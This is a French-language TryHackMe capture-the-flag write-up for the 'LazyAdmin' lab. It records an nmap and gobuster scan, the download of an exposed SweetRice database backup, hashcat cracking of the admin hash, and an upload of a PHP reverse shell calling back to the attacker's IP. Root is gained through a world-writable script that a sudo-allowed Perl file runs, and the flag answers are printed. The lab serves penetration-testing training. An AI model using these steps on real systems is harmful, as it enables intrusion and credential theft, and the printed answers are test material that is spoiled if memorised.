# LazyAdmin #

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.179.175 lazyadmin.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 
```

On configure un DNS pour plus de faciliter.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A lazyadmin.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-20 14:30 CEST
Nmap scan report for lazyadmin.thm (10.10.179.175)
Host is up (0.039s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/20%OT=22%CT=1%CU=33996%PV=Y%DS=2%DC=T%G=Y%TM=60F6C1E
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
OS:1NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   32.32 ms 10.9.0.1
2   32.50 ms lazyadmin.thm (10.10.179.175)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.70 seconds

```

Dans le résultat du scan on remarque plusieurs services disponibles :
-SSH sur le port 22  
-HTTP sur le port 80  

D'après le titre de la page web on remarque c'est la page par défaut d'Apache.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://lazyadmin.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lazyadmin.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/20 14:34:42 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 316] [--> http://lazyadmin.thm/content/]
/server-status        (Status: 403) [Size: 278]                                    
                                                                                   
===============================================================
2021/07/20 14:50:33 Finished
===============================================================
```

Avec gobuster on remarque un lien content regardons ce que c'est.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ lynx http://lazyadmin.thm/content/
 SweetRice notice

   Welcome to SweetRice - Thank your for install SweetRice as your website management system.

This site is building now , please come late.

   If you are the webmaster,please go to Dashboard -> General -> Website setting

   and uncheck the checkbox "Site close" to open your website.

   More help at Tip for Basic CMS SweetRice installed

   Powered by Basic-CMS.ORG SweetRice.

```

Sur la page du navigateur on remarque qu c'est un cms qui a pour nom SweetRice.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ searchsploit sweetrice
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                                                                                                                                     | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                                                                                                                                  | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                                                                                                                                   | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                                                                                     | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                                                                                         | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                                                                                                | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                                                                           | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                                                                                                                                       | php/webapps/14184.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

On remarque qu'il existe des exploits.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat /usr/share/exploitdb/exploits/php/webapps/40718.txt 
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip
```

On regarde les informations dans le fichier il y a un lien qui permet de récupérer les sauvegardes.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ lynx http://lazyadmin.thm/content/inc/mysql_backup/
 [ICO] Name Last modified Size Description
     ________________________________________________________________________________________________________________________________________________________________________________________________________________________________

   [PARENTDIR] Parent Directory   -
   [ ] mysql_bakup_20191129023059-1.5.1.sql 2019-11-29 12:30 4.7K
     ________________________________________________________________________________________________________________________________________________________________________________________________________________________________


    Apache/2.4.18 (Ubuntu) Server at lazyadmin.thm Port 80

tim@kali:~/Bureau/tryhackme/write-up$ wget http://lazyadmin.thm/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
--2021-07-20 15:09:15--  http://lazyadmin.thm/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
Résolution de lazyadmin.thm (lazyadmin.thm)… 10.10.179.175
Connexion à lazyadmin.thm (lazyadmin.thm)|10.10.179.175|:80… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 4809 (4,7K) [application/x-sql]
Sauvegarde en : « mysql_bakup_20191129023059-1.5.1.sql »

mysql_bakup_20191129023059-1.5.1.sql                        100%[=========================================================================================================================================>]   4,70K  --.-KB/s    ds 0s      

2021-07-20 15:09:15 (110 MB/s) — « mysql_bakup_20191129023059-1.5.1.sql » sauvegardé [4809/4809]

```

On télécharge la sauvegarde. 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat mysql_bakup_20191129023059-1.5.1.sql | grep pass
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

Dans le fichier on trouve un hash : 42f749ade7f9e195bf475f37a44cafcb
Et le nom utilisateur : manager
```bash
tim@kali:~/Bureau/tryhackme/write-up$ hash-identifier 42f749ade7f9e195bf475f37a44cafcb | head -20
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
tim@kali:~/Bureau/tryhackme/write-up$ echo "42f749ade7f9e195bf475f37a44cafcb" > hash
tim@kali:~/Bureau/tryhackme/write-up$ hashcat --quiet -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt 
42f749ade7f9e195bf475f37a44cafcb:Password123
```

On casse le mot de passe.  
Le mot de passe est Password123. 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ searchsploit sweetrice
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                                                                                                                                     | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                                                                                                                                  | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                                                                                                                                   | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                                                                                     | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                                                                                         | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                                                                                                | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                                                                           | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                                                                                                                                       | php/webapps/14184.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
tim@kali:~/Bureau/tryhackme/write-up$ cp /usr/share/exploitdb/exploits/php/webapps/40716.py ./
```

On va téléverser un reverse shell sur le site.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
--2021-07-20 15:27:31--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Résolution de raw.githubusercontent.com (raw.githubusercontent.com)… 185.199.108.133, 185.199.110.133, 185.199.111.133, ...
Connexion à raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 5491 (5,4K) [text/plain]
Sauvegarde en : « php-reverse-shell.php »

php-reverse-shell.php                                       100%[=========================================================================================================================================>]   5,36K  --.-KB/s    ds 0s      

2021-07-20 15:27:31 (26,1 MB/s) — « php-reverse-shell.php » sauvegardé [5491/5491]
tim@kali:~/Bureau/tryhackme/write-up$ sed -i "s/127.0.0.1/10.9.228.66/g" php-reverse-shell.php 
tim@kali:~/Bureau/tryhackme/write-up$ mv php-reverse-shell.php shell.php5
```

On télécharge le reverse shell, puis on le modifie pour qu'il fonctionne. 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ python3 40716.py 
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |                                                    
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
Enter The Target URL(Example : localhost.com) : lazyadmin.thm/content
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : shell.php5
[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://lazyadmin.thm/content/attachment/shell.php5
```

Le reverse shell est téléversé, il reste plus que à l'activer.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 .
```

On écoute le port 1234 de notre reverse shell puis sur un autre terminal on lance le reverse shell.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ lynx  http://lazyadmin.thm/content/attachment/shell.php5
```

On obtient un shell.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.179.175] 60960
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 16:52:36 up  1:26,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls /home/
itguy
$ cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

**What is the user flag?**

On récupère notre la première réponse.   
Réponse : THM{63e5bce9271952aad1113b6f1ac28a07}

**What is the root flag?**

```bash
$ cd /home/itguy/
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ ls -al backup.pl	
-rw-r--r-x 1 root root 47 Nov 29  2019 backup.pl
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ ls -al /etc/copy.sh                                    
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh

```

Dans repertoire de l'utilisateur itguy on voit un fichier backup.pl il ne peut que être modifié par root.  
Quand on regarde dans le fichier backup.pl on constate qu'il exécute le fichier /etc/copy.sh.  
Le fichier copy.sh être modifié pour tout le monde.  

```bash
$ echo "cat /root/root.txt > /home/itguy/reponse.txt" > /etc/copy.sh 
```

On modifie le fichier copy.sh pour qu'il écrive la réponse dans un endroit ou peut lire le fichier.   

```bash
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@THM-Chal:/tmp/itguy$ 
www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

La configuration de sudo nous permet d'exécuter backup.pl sans mot de pass.

```bash
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl    
sudo /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$ cat reponse.txt
THM{6637f41d0177b6f37cb20d775124699f}
```
On peut lire de dernier flag.  
La réponse est : THM{6637f41d0177b6f37cb20d775124699f}   